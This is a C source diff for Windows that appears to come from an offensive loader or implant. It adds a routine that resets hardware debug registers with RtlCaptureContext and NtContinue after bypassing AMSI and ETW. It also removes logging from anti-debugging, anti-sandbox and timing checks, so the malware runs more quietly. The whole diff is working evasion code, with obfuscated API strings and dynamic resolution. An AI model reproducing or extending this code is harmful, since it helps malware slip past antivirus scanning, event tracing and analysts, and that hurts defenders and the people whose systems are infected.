@@ -183,13 +183,40 @@ VOID CleanupEvasion(IN PAPI_HASHING pApi) {
     if (pRtlRemoveVeh)
         pRtlRemoveVeh(g_hVeh);
 
+    // Clear hardware breakpoints via RtlCaptureContext + NtContinue
+    // Reuse g_bHwBpSet (TRUE) as guard to prevent infinite NtContinue loop
+    BYTE xCapCtx[] = XSTR_RTL_CAPTURE_CTX;
+    DEOBF(xCapCtx);
+    fnRtlCaptureContext pRtlCaptureCtx =
+        (fnRtlCaptureContext)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xCapCtx);
+
+    BYTE xNtCont[] = XSTR_NT_CONTINUE;
+    DEOBF(xNtCont);
+    fnNtContinue pNtContinue =
+        (fnNtContinue)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xNtCont);
+
+    if (pRtlCaptureCtx && pNtContinue && g_bHwBpSet) {
+        CONTEXT ctx;
+        MemSet(&ctx, 0, sizeof(ctx));
+        pRtlCaptureCtx(&ctx);
+
+        if (g_bHwBpSet) {
+            g_bHwBpSet = FALSE;
+            ctx.Dr0 = 0;
+            ctx.Dr1 = 0;
+            ctx.Dr7 = 0;
+            ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
+            pNtContinue(&ctx, FALSE);
+        }
+    }
+
     // Clear all evasion state
     g_hVeh             = NULL;
     g_pEtwEventWrite   = NULL;
     g_pAmsiScanBuffer  = NULL;
     g_bHwBpSet         = FALSE;
 
-    LOG("[+] Evasion cleanup: VEH removed, state cleared");
+    LOG("[+] Evasion cleanup: VEH removed, debug registers cleared");
 }
 
 // -----------------------------------------------
@@ -199,31 +226,19 @@ VOID CleanupEvasion(IN PAPI_HASHING pApi) {
 BOOL AntiAnalysis(VOID) {
 
     PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
-    if (!pPeb) {
-        LOG("  [AA] PEB is NULL");
+    if (!pPeb)
         return FALSE;
-    }
 
     // 1. Check PEB->BeingDebugged
-    if (pPeb->BeingDebugged) {
-        LOG("  [AA] BLOCKED: BeingDebugged=TRUE");
+    if (pPeb->BeingDebugged)
         return FALSE;
-    }
-    LOG("  [AA] BeingDebugged: OK");
-
     // 2. Check NtGlobalFlag
-    if (pPeb->NtGlobalFlag & 0x70) {
-        LOG("  [AA] BLOCKED: NtGlobalFlag has debug flags");
+    if (pPeb->NtGlobalFlag & 0x70)
         return FALSE;
-    }
-    LOG("  [AA] NtGlobalFlag: OK");
 
     // 3. Check number of processors (sandboxes often have 1)
-    if (pPeb->NumberOfProcessors < 2) {
-        LOG("  [AA] BLOCKED: NumberOfProcessors < 2");
+    if (pPeb->NumberOfProcessors < 2)
         return FALSE;
-    }
-    LOG("  [AA] NumberOfProcessors: OK");
 
     // 4. Timing check
     ULONGLONG tsc1 = __rdtsc();
@@ -231,11 +246,8 @@ BOOL AntiAnalysis(VOID) {
     for (int i = 0; i < 100; i++) dummy += i;
     ULONGLONG tsc2 = __rdtsc();
 
-    if ((tsc2 - tsc1) > 10000000) {
-        LOG("  [AA] BLOCKED: RDTSC timing anomaly");
+    if ((tsc2 - tsc1) > 10000000)
         return FALSE;
-    }
-    LOG("  [AA] RDTSC: OK");
 
     return TRUE;
 }
